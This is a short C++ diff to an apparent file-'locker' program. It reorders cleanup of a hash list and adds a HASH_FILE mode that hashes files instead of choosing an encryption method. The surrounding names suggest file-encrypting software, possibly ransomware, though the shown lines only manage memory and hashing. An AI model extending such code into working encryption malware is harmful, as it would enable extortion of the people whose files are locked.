@@ -161,9 +161,19 @@ void locker::FreeCryptInfo(CRYPT_INFO* CryptInfo)
 	if (!CryptInfo)
 		return;
 
-	if(GEN)
+
+	if (CryptInfo->hash_data.HashList)
 	{
-		delete CryptInfo; 
+		PHLIST dataHash = NULL;
+		SLIST_FOREACH(dataHash, CryptInfo->hash_data.HashList)
+			memory::m_free(dataHash->hash);
+
+		delete CryptInfo->hash_data.HashList;
+	}
+
+	if(GEN || HASH_FILE)
+	{
+		delete CryptInfo;
 		return;
 	}
 
@@ -205,16 +215,6 @@ void locker::FreeCryptInfo(CRYPT_INFO* CryptInfo)
 		CryptInfo->ctx = NULL;
 	}
 
-	if (CryptInfo->hash_data.HashList)
-	{
-		PHLIST dataHash = NULL;
-		SLIST_FOREACH(dataHash, CryptInfo->hash_data.HashList)
-			memory::m_free(dataHash->hash);
-
-		delete CryptInfo->hash_data.HashList;
-	}
-
-
 	delete CryptInfo;
 }
 
@@ -223,6 +223,13 @@ bool locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
 {
 	CRYPTO_SYSTEM sys;
 	CryptoSystemInit(&sys);
+
+	if(HASH_FILE)
+	{
+		CryptInfo->hash_data.HashList = new SLIST<HASH_LIST>;
+		CryptInfo->hash_sum_method = (HashSumFunc)filesystem::hash_file;
+		return true;
+	}
 
 	if (!CryptSystemGetMethod(&sys, GLOBAL_ENUM.g_EncryptMethod, CryptInfo))
 		return false;
